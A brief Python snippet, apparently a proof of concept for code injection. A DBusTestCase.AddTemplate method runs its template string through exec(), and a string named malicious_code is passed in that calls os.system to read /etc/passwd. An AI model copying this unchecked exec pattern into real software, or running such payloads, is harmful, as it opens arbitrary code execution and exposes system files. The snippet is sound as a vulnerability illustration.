class DBusTestCase:
    def AddTemplate(self, template_name, template_code):
        exec(template_code)

test_case = DBusTestCase()
malicious_code = "__import__('os').system('cat /etc/passwd')"
test_case.AddTemplate("malicious_template", malicious_code)